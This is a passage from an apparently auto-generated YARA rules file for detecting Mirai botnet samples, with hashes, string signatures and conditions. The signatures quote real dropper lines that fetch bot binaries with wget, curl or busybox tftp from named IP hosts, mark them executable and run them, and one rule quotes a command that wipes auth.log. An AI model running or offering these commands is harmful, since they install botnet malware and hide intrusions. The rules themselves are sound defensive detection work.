      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.arc; curl -O http://163.227" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.arm; curl -O http://163.227" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.arm; curl -O http://163.227" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.ppc; curl -O http://163.227" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.arc; curl -O http://163.227" ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.spc; curl -O http://163.227" ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.mips; curl -O http://163.22" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.i468; curl -O http://163.22" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.x86_64; curl -O http://163." ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.sh4; curl -O http://163.227" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.arm6; curl -O http://163.22" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.mpsl; curl -O http://163.22" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.227.230.253/hiddenbin/boatnet.m68k; curl -O http://163.22" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__ac9c3ea4 {
   meta:
      description = "_subset_batch - file Mirai(signature)_ac9c3ea4.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ac9c3ea434fbb556738623b3f7de4651b3cede9cfbe78e8ab6d7ea0b4b7bb585"
   strings:
      $s1 = "5>7 !\")~" fullword ascii /* score: '9.00'*/ /* hex encoded string 'W' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__acdeb9f2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_acdeb9f2.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "acdeb9f2c3af7a5e8add1bb05ea1d5b11233b69bb942932716d96fc7f7bbe1f4"
   strings:
      $s1 = "wget http://161.97.106.129/systemcl/ppc; chmod 777 ppc; ./ppc ppc" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://161.97.106.129/systemcl/x86_64; chmod 777 x86_64; ./x86_64 x86_64" fullword ascii /* score: '23.00'*/
      $s3 = "wget http://161.97.106.129/systemcl/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '23.00'*/
      $s4 = "wget http://161.97.106.129/systemcl/arm; chmod 777 arm; ./arm arm" fullword ascii /* score: '23.00'*/
      $s5 = "wget http://161.97.106.129/systemcl/x86; chmod 777 x86; ./x86 x86" fullword ascii /* score: '23.00'*/
      $s6 = "wget http://161.97.106.129/systemcl/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '23.00'*/
      $s7 = "wget http://161.97.106.129/systemcl/mpsl; chmod 777 mpsl; ./mpsl mpsl" fullword ascii /* score: '23.00'*/
      $s8 = "wget http://161.97.106.129/systemcl/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '23.00'*/
      $s9 = "wget http://161.97.106.129/systemcl/m68k; chmod 777 m68k; ./m68k m68k" fullword ascii /* score: '23.00'*/
      $s10 = "wget http://161.97.106.129/systemcl/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '23.00'*/
      $s11 = "wget http://161.97.106.129/systemcl/sh4; chmod 777 sh4; ./sh4 sh4" fullword ascii /* score: '23.00'*/
      $s12 = "wget http://161.97.106.129/systemcl/spc; chmod 777 spc; ./spc spc" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 2KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _Mirai_signature__7b9ad2bc_Mirai_signature__8f98b0b9_Mirai_signature__a4b021da_0 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_7b9ad2bc.elf, Mirai(signature)_8f98b0b9.elf, Mirai(signature)_a4b021da.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7b9ad2bc05ebc0bb5eb05cc218242ecf663d6861b343b251bc8aa0528aa45e4f"
      hash2 = "8f98b0b9f71334b01378acfc831639ccb71f64cec31e52a0348f6ff6abdd2334"
      hash3 = "a4b021da39569a9e1b41a5602acbc99ad350eb7d99937d25f0286ed844f574db"
   strings:
      $s1 = "e != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" fullword ascii /* score: '24.00'*/
      $s2 = "glibc.pthread.mutex_spin_count" fullword ascii /* score: '21.00'*/
      $s3 = "type == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii /* score: '21.00'*/
      $s4 = "PTHREAD_MUTEX_TYPE (mutex) == PTHREAD_MUTEX_ERRORCHECK_NP" fullword ascii /* score: '21.00'*/
      $s5 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s6 = "pthread_mutex_conf.o" fullword ascii /* score: '18.00'*/
      $s7 = "___pthread_mutex_lock" fullword ascii /* score: '18.00'*/
      $s8 = "pthread_mutex_lock.o" fullword ascii /* score: '18.00'*/
      $s9 = "___pthread_mutex_unlock" fullword ascii /* score: '18.00'*/
      $s10 = "pthread_mutex_unlock.o" fullword ascii /* score: '18.00'*/
      $s11 = "%s%s%s:%u: %s%sAssertion `%s' failed." fullword ascii /* score: '16.50'*/
      $s12 = "EHWPOISON" fullword ascii /* score: '16.50'*/
      $s13 = "failed to allocate memory to process tunables" fullword ascii /* score: '16.00'*/
      $s14 = "mutex->__data.__owner == 0" fullword ascii /* score: '15.00'*/
      $s15 = "ELF load command address/offset not page-aligned" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6db3a177_Mirai_signature__6e668bb5_Mirai_signature__719f1ad5_Mirai_signature__7bd91377_Mirai_signature__7c_1 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6db3a177.elf, Mirai(signature)_6e668bb5.elf, Mirai(signature)_719f1ad5.elf, Mirai(signature)_7bd91377.elf, Mirai(signature)_7cee4ac4.elf, Mirai(signature)_7e7ed21f.elf, Mirai(signature)_7ed37f25.elf, Mirai(signature)_7f12c8ad.elf, Mirai(signature)_7f7f0d71.elf, Mirai(signature)_803fc41d.elf, Mirai(signature)_827c160f.elf, Mirai(signature)_8571d041.elf, Mirai(signature)_8765389e.elf, Mirai(signature)_878231e8.elf, Mirai(signature)_8c714bda.elf, Mirai(signature)_8d05357c.elf, Mirai(signature)_8d37351f.elf, Mirai(signature)_8d786cca.elf, Mirai(signature)_8db72cf3.elf, Mirai(signature)_8e515c52.elf, Mirai(signature)_8e895adc.elf, Mirai(signature)_91a75187.elf, Mirai(signature)_95aaa966.elf, Mirai(signature)_9626c2cd.elf, Mirai(signature)_9676d340.elf, Mirai(signature)_97802b1d.elf, Mirai(signature)_99920319.elf, Mirai(signature)_9d678687.elf, Mirai(signature)_9db44728.elf, Mirai(signature)_a060b49c.elf, Mirai(signature)_a15024db.elf, Mirai(signature)_a31264c5.elf, Mirai(signature)_a49c0bbe.elf, Mirai(signature)_a4a844a5.elf, Mirai(signature)_a64df1d1.elf, Mirai(signature)_a84f6566.elf, Mirai(signature)_aa3734d3.elf, Mirai(signature)_ab2d4681.elf, Mirai(signature)_ac47df80.elf, Mirai(signature)_ac5d1b44.elf, Mirai(signature)_ad6b7a16.elf, Mirai(signature)_b0aff673.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6db3a1777017535d3135eaa931e02a5512be5eec3571261740d71addc050a9e6"
      hash2 = "6e668bb59635e43604cacaf2067fb0c89ea7764f30867059429dbc92ae95d7bf"
      hash3 = "719f1ad5d390910e62956a2f1cdfea9a432c6041d6c5765f9713c091d0ce2e66"
      hash4 = "7bd913776eaa318cdd4eac133b27578c9eec59bcda1e9b2a8f5cd60218683695"
      hash5 = "7cee4ac4c5c52fb2d0c2d6edd4dec611dfebace1eae0d58d56b2429ff5a66397"
      hash6 = "7e7ed21fc051b096ab0d5507e254c8855fa81533a30577ce72c71dbfe6ccc901"
      hash7 = "7ed37f25afae39680c46ec7059d465dfe42d4575729aea85736768062750694b"
      hash8 = "7f12c8ad451f4df4f9eaf2f533bfd3f77efd4427f08513d0f30833a7875f035a"
      hash9 = "7f7f0d711bbb3fd8c747e86a594c875ace72c37a48c3b1332e14a84f92bfd0ab"
      hash10 = "803fc41d02729507424e4fda1127ff7e559b2150c81aea4ec000e2189fbf16b6"
      hash11 = "827c160f408822ca75b51c498f257842f75ea9a12b6428420688744c302a0703"
      hash12 = "8571d0411fc287f3cdf03bfe953433b4fc187dba200a3c4164fac2bce0037e93"
      hash13 = "8765389e5e03b5780b01160276d83b19ae610eaf5dc834b0a853131d084ef894"
      hash14 = "878231e8edc53ba8bbc1f6f05a72fda2e9c3c00aa9722e859496bde9969f585b"
      hash15 = "8c714bdaa8914237ba7dc9eaa764184ae17ed4c5eeede566aaffecd1d47fe5bc"
      hash16 = "8d05357cedcd5d0c92e1d0268e43e22b47ac755185458f7556e266041c6cc2e4"
      hash17 = "8d37351feb40c8cffa43b778bc7087eb6b516b5e498244e640ab366d276d4800"
      hash18 = "8d786ccae620d4e466b4acc6f00263008f96ccfcaee98f194806d08f7cdae41d"
      hash19 = "8db72cf3c17c8e2ce37789cc8c7f1403a8f8ae0d790cc9df566365e20268c2d0"
      hash20 = "8e515c524d7749bc86597c8b5b7759683fa8a614b8ab125c67ef2397bb057d6e"
      hash21 = "8e895adc6e77daafd4791dcc816487cbfa42688b2fbd1b66a99c37b5da14c2ea"
      hash22 = "91a75187b0ddb735e9e3920150fc7eca5115e1a59000442a366e3b938cd473d0"
      hash23 = "95aaa9662104a4d431c88ce9422df8c6c34ac73225ba716febae85b96470f455"
      hash24 = "9626c2cd56c5ee20d77ea2aaa5de959f75783bebe579088d2fc4f4d61c34b50f"
      hash25 = "9676d340c5229ce5c1a79621e346bce300e02f5736133bba695438daaad87a30"
      hash26 = "97802b1dea30453d690bc2907b6ca1f8f669075fb0c99991fb14a9d3afaf74a7"
      hash27 = "999203197097afae9c40fb98be8c71c8692aa45df3cae7edb23a74f94149401a"
      hash28 = "9d6786871dc94431af660bba8fd943feeca68e3f5bcabe6cb6b52c68b91eaec2"
      hash29 = "9db4472896aa7f67644efc5cac5ad0022c0baa5e18e4adfb9ae9fb6d92ad8749"
      hash30 = "a060b49c7c50f1133d3ad2218c7ff266e7b637e64bdc68a4d2cfc460f0075d9b"
      hash31 = "a15024dbe8201dea7d95a48a51e71b299f0f3e79b68911e89cb0372fc7ef039f"
      hash32 = "a31264c50f0c10ecdc54a6bd3d05c8be5554479c2ff751b64e6794f7a5e99f17"
      hash33 = "a49c0bbe50874e64bfb1bf6a17e609e9e9ae12535b279ebd9927bebc728905b1"
      hash34 = "a4a844a50d5fe49442dd85f6b0b7750f229ad8b7e35261e2b9f911d846d6892f"
      hash35 = "a64df1d17f7c1575c62efe35fa466d6217cddb6b813ea9fc7039b3a451326c93"
      hash36 = "a84f65668fc77f814ad920b60f5733c69ac7ff91bfa05836675d6019ea38bf82"
      hash37 = "aa3734d3fc00b1ba582d9b2ba250db27334e5b094d1c40ee62234614afafce60"
      hash38 = "ab2d4681a3b0f00268a5f0c83e7a1b065b98fba7a8b3711900e28fae805f1d90"
      hash39 = "ac47df80a238e71e50a70d4b63755a33db18654650a145e56838276135d6c8a6"
      hash40 = "ac5d1b44b3ac7c62d5e5872279097c57d5d3cd3992c88773fb9d86f8013388bf"
      hash41 = "ad6b7a1640f575d8c0234516f5b5c68444df92e096ead00bc8501824951c7cb1"
      hash42 = "b0aff673461d8e95841f9f8f5182f2482aab376a2a3d71e53dc65d8ad0c40c65"
   strings:
      $s1 = "/bin/busybox wget %s%s -O .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s2 = "/bin/busybox tftp -g %s -P %u -r %s -l .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s3 = "curl %s%s -o .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '25.00'*/
      $s4 = "echo > /var/log/auth.log 2>/dev/null" fullword ascii /* score: '23.00'*/
      $s5 = "[%s:%d->%s:%d] USER-AGENT: %s" fullword ascii /* score: '22.50'*/
      $s6 = "[%s:%d->%s:%d] PASSWORD: %s" fullword ascii /* score: '21.50'*/
      $s7 = "sysctl -w net.ipv6.conf.all.forwarding=1 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s8 = "[PRIORITY - %s] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s9 = "[HTTP POST/PUT] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s10 = "user-agent: " fullword ascii /* score: '17.00'*/
      $s11 = "sysctl -w net.ipv4.ip_forward=1 2>/dev/null" fullword ascii /* score: '17.00'*/
      $s12 = "User-Agent: wget" fullword ascii /* score: '17.00'*/
      $s13 = "User-Agent: curl" fullword ascii /* score: '17.00'*/
      $s14 = "User-Agent: Wget/1.12 (linux-gnu)" fullword ascii /* score: '17.00'*/
      $s15 = "HOST:%s|KERNEL:%s|ARCH:%s|" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__8f98b0b9_Mirai_signature__a4b021da_2 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_8f98b0b9.elf, Mirai(signature)_a4b021da.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8f98b0b9f71334b01378acfc831639ccb71f64cec31e52a0348f6ff6abdd2334"
      hash2 = "a4b021da39569a9e1b41a5602acbc99ad350eb7d99937d25f0286ed844f574db"
   strings:
      $s1 = "%s: Symbol `%s' has different size in shared object, consider re-linking" fullword ascii /* score: '12.50'*/
      $s2 = "dl-execstack.o" fullword ascii /* score: '12.00'*/
      $s3 = "sched_getp.o" fullword ascii /* score: '9.00'*/
      $s4 = "sched_gets.o" fullword ascii /* score: '9.00'*/
      $s5 = "getuid.o" fullword ascii /* score: '9.00'*/
      $s6 = "getenv.o" fullword ascii /* score: '9.00'*/
      $s7 = "getrlimit.o" fullword ascii /* score: '9.00'*/
      $s8 = "getsockopt.o" fullword ascii /* score: '9.00'*/
      $s9 = "dcgettext.o" fullword ascii /* score: '9.00'*/
      $s10 = "geteuid.o" fullword ascii /* score: '9.00'*/
      $s11 = "__gnu_unwind_get_pr_addr" fullword ascii /* score: '9.00'*/
      $s12 = "getsockname.o" fullword ascii /* score: '9.00'*/
      $s13 = "getclktck.o" fullword ascii /* score: '9.00'*/
      $s14 = "get_child_max.o" fullword ascii /* score: '9.00'*/
      $s15 = "getpid.o" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__770bc386_Mirai_signature__7b9ad2bc_Mirai_signature__874c2cca_Mirai_signature__8f98b0b9_Mirai_signature__94_3 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_770bc386.elf, Mirai(signature)_7b9ad2bc.elf, Mirai(signature)_874c2cca.elf, Mirai(signature)_8f98b0b9.elf, Mirai(signature)_94084fdc.elf, Mirai(signature)_953cfae4.elf, Mirai(signature)_95960709.elf, Mirai(signature)_a4b021da.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "770bc3867fca939a053d5fb7db2ee676eee5bce2c29237f1d035600908cea214"
      hash2 = "7b9ad2bc05ebc0bb5eb05cc218242ecf663d6861b343b251bc8aa0528aa45e4f"
      hash3 = "874c2cca5f76471c17a1f8112e4d5fead1edc8c44cc3bad4095f2cebd8bfef67"
      hash4 = "8f98b0b9f71334b01378acfc831639ccb71f64cec31e52a0348f6ff6abdd2334"
      hash5 = "94084fdc4a08a4bfd611880589ccab03c03cd1d61acbd56388b424de6d692e94"
      hash6 = "953cfae41801e12a9348e85fc2814507ebcd82365f4b26ed661216208a6f0318"
      hash7 = "959607091dea5bff127f353d69964706af21963e030a1f19e8eb63b5ff0279eb"
      hash8 = "a4b021da39569a9e1b41a5602acbc99ad350eb7d99937d25f0286ed844f574db"
   strings:
      $s1 = "SPOOFEDHASH" fullword ascii /* score: '19.50'*/
      $s2 = "dakuexecbin" fullword ascii /* score: '19.00'*/
      $s3 = "sefaexec" fullword ascii /* score: '16.00'*/
      $s4 = "deexec" fullword ascii /* score: '13.00'*/
      $s5 = "1337SoraLOADER" fullword ascii /* score: '13.00'*/
      $s6 = "SO190Ij1X" fullword ascii /* base64 encoded string ';_t"=W' */ /* score: '11.00'*/
      $s7 = "trojan" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s8 = "airdropmalware" fullword ascii /* score: '10.00'*/
      $s9 = "GhostWuzHere666" fullword ascii /* score: '10.00'*/
      $s10 = "scanspc" fullword ascii /* score: '9.00'*/
      $s11 = "scanmips" fullword ascii /* score: '9.00'*/
      $s12 = "scanmpsl" fullword ascii /* score: '9.00'*/
      $s13 = "scanppc" fullword ascii /* score: '9.00'*/
      $s14 = "chickenxings" fullword ascii /* score: '8.00'*/
      $s15 = "btbatrtah" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6fa04384_Mirai_signature__90e3b997_4 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6fa04384.elf, Mirai(signature)_90e3b997.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6fa043849b7eaf72769786c99d693c11ee82b885250fad3f7dd4ade24866267a"
      hash2 = "90e3b997161e33c6485b48182073a864dd3d0775ab96cadbf1b7c9dd4821c6d1"
   strings:
      $s1 = "eeeeeeeefffffff" ascii /* reversed goodware string 'fffffffeeeeeeee' */ /* score: '18.00'*/
      $s2 = "hhhhhg" fullword ascii /* reversed goodware string 'ghhhhh' */ /* score: '15.00'*/
      $s3 = "dddd<<<<" fullword ascii /* reversed goodware string '<<<<dddd' */ /* score: '14.00'*/
      $s4 = "xxxxxxxxyyyyyy" fullword ascii /* score: '11.00'*/
      $s5 = "<<<<<<<<<;" fullword ascii /* reversed goodware string ';<<<<<<<<<' */ /* score: '11.00'*/
      $s6 = "%%%%%%%!" fullword ascii /* reversed goodware string '!%%%%%%%' */ /* score: '11.00'*/
      $s7 = "999998" ascii /* reversed goodware string '899999' */ /* score: '11.00'*/
      $s8 = "<<<<<5<<<<<<<<+%B" fullword ascii /* score: '9.00'*/ /* hex encoded string '[' */
      $s9 = "ccccccccccccccccccccccccccccccccccccccccccccccccccckcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc" ascii /* score: '8.00'*/
      $s10 = "fffffbffff" ascii /* score: '8.00'*/
      $s11 = "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc" ascii /* score: '8.00'*/
      $s12 = "ddddddddddddddddddddd]<7%%%x%%%%%%%" fullword ascii /* score: '8.00'*/
      $s13 = "cccccccccccccccccccccccccccccccccccccccccccc" ascii /* score: '8.00'*/
      $s14 = "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc" ascii /* score: '8.00'*/
      $s15 = "ddddddf" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__8206a861_Mirai_signature__84cec034_5 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_8206a861.elf, Mirai(signature)_84cec034.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8206a86179a3c93abee46ec9a8aa7b9157af261afd0b128394941b5dface1571"
      hash2 = "84cec0346f281832bb14a14d363f194bfda474e57b7eed9741c37e5fa681d327"
   strings:
      $s1 = "pthread_mutex_trylock.c" fullword ascii /* score: '18.00'*/
      $s2 = "__pthread_mutex_unlock_internal" fullword ascii /* score: '18.00'*/
      $s3 = "pthread_mutex_destroy.c" fullword ascii /* score: '18.00'*/
      $s4 = "__pthread_mutex_lock_internal" fullword ascii /* score: '18.00'*/
      $s5 = "pthread_mutex_init.c" fullword ascii /* score: '18.00'*/
      $s6 = "attack_bypass.c" fullword ascii /* score: '15.00'*/
      $s7 = "pthread_getspecific.c" fullword ascii /* score: '12.00'*/
      $s8 = "__make_stacks_executable" fullword ascii /* score: '12.00'*/
      $s9 = "h2_user_agents" fullword ascii /* score: '12.00'*/
      $s10 = "h2_tls_user_agents" fullword ascii /* score: '12.00'*/
      $s11 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/unwind-c.c" fullword ascii /* score: '11.00'*/
      $s12 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc" fullword ascii /* score: '11.00'*/
      $s13 = "_thread_db_pthread_key_struct_destr" fullword ascii /* score: '10.00'*/
      $s14 = "_thread_db_pthread_key_data_seq" fullword ascii /* score: '10.00'*/
      $s15 = "https_worker_thread" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__7d21c6a9_Mirai_signature__7eef45e6_Mirai_signature__81a4de40_Mirai_signature__8bcbd269_Mirai_signature__8e_6 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_7d21c6a9.elf, Mirai(signature)_7eef45e6.elf, Mirai(signature)_81a4de40.elf, Mirai(signature)_8bcbd269.elf, Mirai(signature)_8ed30a24.elf, Mirai(signature)_91463ce2.elf, Mirai(signature)_987f7e76.elf, Mirai(signature)_9bd72f4a.elf, Mirai(signature)_9cab7a52.elf, Mirai(signature)_9d328f65.elf, Mirai(signature)_a376a813.elf, Mirai(signature)_a609c96d.elf, Mirai(signature)_a6ec6863.elf, Mirai(signature)_a7ce2785.elf, Mirai(signature)_a9cd33a2.elf, Mirai(signature)_af915026.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7d21c6a95be4bd3d9bdb864db161fee339004977c2515e6eb0d9c88b2de0e69d"
      hash2 = "7eef45e616fd3d2ae0451c895033f2f8931589eb39abf062e91f0d67766b34dc"
      hash3 = "81a4de40df5439551834e48c097107dd9176e89046e26127afbce71e614b0359"
      hash4 = "8bcbd26960639878a7ef1ad5960df2d5dcc996a6405d5424bebea27535c1d3e4"
      hash5 = "8ed30a24addbae5a6c1bc5f4cc3bc3a0e977bae90199379f14a1a89915ef1754"
      hash6 = "91463ce2d8c9f2c13721e1cb0ef7e1604f9b133f5743d082c7311ec6c1db836a"
      hash7 = "987f7e7678fa5d168d937a89fa4a82d696fa95831f0b1ed78dab74b6fc2a42e3"
      hash8 = "9bd72f4ae6b6f38b9bfdd6e784c1add70d86f8f420f2bf718d20d4317f67c245"
      hash9 = "9cab7a52815df905dc2806b5b85aa4aa3553d5db14723831729387a882e2aac0"
      hash10 = "9d328f65c944f1043f487c4992a19f80d6142d36f0cf49396e024d159afa6723"
      hash11 = "a376a81308501bd0e0352d64fd25820da2e3198f8418bb110dabc9ea67ba7f34"
      hash12 = "a609c96dc1ae19a4a4a14d6f067afa23ef385c1f7dccac66b3ba38da975f0bc5"
      hash13 = "a6ec68635f2000d140eb6010d0133db3ec9170f1f73f752938f35fa165722dcd"
      hash14 = "a7ce2785a746d714cd6407d2a8ef07c9d510e10b46f0f8d0d4a266cc16774a57"
      hash15 = "a9cd33a22309c43696b80537f4e5cf30bfc39203875b1b99abcbb3b472c7e798"
      hash16 = "af91502655331308b7b116b0bb264f08c62e7bd6a8799651d0771e32049207bc"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARCompact" fullword ascii /* score: '20.50'*/
      $s2 = "%s():%i: Circular dependency, skipping '%s'," fullword ascii /* score: '17.50'*/
      $s3 = "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s4 = "%s:%i: relocation processing: %s" fullword ascii /* score: '16.50'*/
      $s5 = "%s():%i: %s: usage count: %d" fullword ascii /* score: '14.50'*/
      $s6 = "%s():%i: running dtors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s7 = "%s():%i: Lib: %s already opened" fullword ascii /* score: '12.50'*/
      $s8 = "%s():%i: __address: %p  __info: %p" fullword ascii /* score: '12.50'*/
      $s9 = "%s():%i: running ctors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s10 = "////////////," fullword ascii /* reversed goodware string ',////////////' */ /* score: '11.00'*/
      $s11 = "m|||||||" fullword ascii /* reversed goodware string '|||||||m' */ /* score: '11.00'*/
      $s12 = "&|||||" fullword ascii /* reversed goodware string '|||||&' */ /* score: '11.00'*/
      $s13 = "searching RUNPATH='%s'" fullword ascii /* score: '10.00'*/
      $s14 = "%s():%i: Move %s from pos %d to %d in INIT/FINI list." fullword ascii /* score: '9.50'*/
      $s15 = "%s():%i: Trying to load '%s', needed by '%s'" fullword ascii /* score: '9.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d144ff0_Mirai_signature__70ae2421_Mirai_signature__70e11049_Mirai_signature__70f473c7_Mirai_signature__84_7 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d144ff0.elf, Mirai(signature)_70ae2421.elf, Mirai(signature)_70e11049.elf, Mirai(signature)_70f473c7.elf, Mirai(signature)_844ac003.elf, Mirai(signature)_848869fb.elf, Mirai(signature)_85522c0c.elf, Mirai(signature)_869f50c7.elf, Mirai(signature)_89fa8230.elf, Mirai(signature)_919d2b3d.elf, Mirai(signature)_9538fec5.elf, Mirai(signature)_9eada9e7.elf, Mirai(signature)_a3bf5ed2.elf, Mirai(signature)_a99c4815.elf, Mirai(signature)_aa2a31bc.elf, Mirai(signature)_ab270778.elf, Mirai(signature)_ae93d820.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d144ff0ea4ee4c4b69c74316a9e0316db85efb4b24eee079238ca699c8d22b4"
      hash2 = "70ae2421c44888060b21a1bd3d083c12394a34f76f27b89a15a84684162aa2e5"
      hash3 = "70e110499d9b759dd240fad8e9a79bf21cb61801ef7f9bd7de9e4fe2b840ab4d"
      hash4 = "70f473c758172b4c8daebde3ec69f553dd250bfe49b65e15d8acfcc2383ba202"
      hash5 = "844ac003aa6961360aa376bb5cc0deee0e48fcf688bdc8ece09a86cea4cb7f01"
      hash6 = "848869fbc73a981e67d9d828fbd59729bc07b88bd8d4677d8c8988aa2a5c07da"
      hash7 = "85522c0c606792d409f3dd9faf8f89d72378c6b31e6d04bd5e4ad7d9c96fccd6"
      hash8 = "869f50c722c0eda6579569094f25ecae49e8ff5235fda937e4f147a1222dbebe"
      hash9 = "89fa82309afe76391b58e5d7a611e41d9743304f9d552fd10510cf062463928c"
      hash10 = "919d2b3dd85c5d1e9191cd3c972135a7a570bcc8c54193f74062aec265adf843"
      hash11 = "9538fec56c2f7397772a1d3bd3a909165b295ee2acbe4a8349735d270fb6926f"
      hash12 = "9eada9e76633b0ee6b5e79d12976e46f8c5b6e5a91e15e3ef0143a5958cbeb0c"
      hash13 = "a3bf5ed2eb9c21403a3894b0f182ea6d21eb571dcaa566fbf9d02473303edc4c"
      hash14 = "a99c4815b1e9e3e80c5153d00e7d6cf56994b81cfec6570a018472b89b82bac1"
      hash15 = "aa2a31bc57e8e83fcf8c757acd5eeb2aacb0a528486c314c0574e5e93d8962e4"
      hash16 = "ab270778dd3275544a794b0961f2880965f340a3a2c1b51b1c2f343163e7c59c"
      hash17 = "ae93d820fb2fd9ec80de19f11ef6254b741d96de849f449ef664334e410eb8a6"
   strings:
      $s1 = "txt.awsdns-hostedzone-info.com" fullword ascii /* score: '26.00'*/
      $s2 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s3 = "execute_xor_commands" fullword ascii /* score: '22.00'*/
      $s4 = "dkim20._domainkey.godaddy.com" fullword ascii /* score: '21.00'*/
      $s5 = "dnssec-failover.cloudflare.com" fullword ascii /* score: '21.00'*/
